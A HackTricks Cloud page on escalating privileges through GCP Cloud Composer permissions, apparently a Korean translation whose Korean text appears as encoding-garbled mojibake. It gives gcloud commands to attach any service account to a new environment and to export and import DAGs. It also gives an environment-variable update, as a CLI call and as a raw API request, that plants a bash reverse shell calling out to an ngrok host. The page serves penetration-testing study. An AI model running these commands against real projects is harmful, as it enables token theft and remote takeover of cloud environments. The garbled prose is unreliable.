# GCP - Composer Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## composer

ë” ë§ì€ ì •ë³´:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

í•´ë‹¹ ê¶Œí•œìœ¼ë¡œ ìƒˆë¡œ ìƒì„±ëœ composer í™˜ê²½ì— **ì–´ë–¤ ì„œë¹„ìŠ¤ ê³„ì •ì´ë“  ì²¨ë¶€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‚˜ì¤‘ì— composer ë‚´ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ë„ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
ë” ë§ì€ ì •ë³´ë¥¼ ì›í•œë‹¤ë©´ [**ì—¬ê¸°**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/i-composer.environmets.create.sh)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

### `composer.environments.update`

ì»´í¬ì € í™˜ê²½ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

í•  ì¼: ìƒˆ pypi íŒ¨í‚¤ì§€ë¥¼ í™˜ê²½ì— ì¶”ê°€í•˜ì—¬ RCE ê°€ì ¸ì˜¤ê¸°

### Dags ë‹¤ìš´ë¡œë“œ

ì‹¤í–‰ë˜ëŠ” dagsì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### Dags ê°€ì ¸ì˜¤ê¸°

í™˜ê²½ì„ ì¹¨í•´í•˜ê³  ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì—ì„œ í† í°ì„ ë„ìš©í•  ìˆ˜ ìˆë„ë¡ Dags ì½”ë“œë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/asd
```
{% endcode %}

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°

í•  ì¼: í”ŒëŸ¬ê·¸ì¸ì„ ì—…ë¡œë“œí•˜ì—¬ ì–´ë–¤ ê²ƒì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸

### ë°ì´í„° ê°€ì ¸ì˜¤ê¸°

í•  ì¼: ë°ì´í„°ë¥¼ ì—…ë¡œë“œí•˜ì—¬ ì–´ë–¤ ê²ƒì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
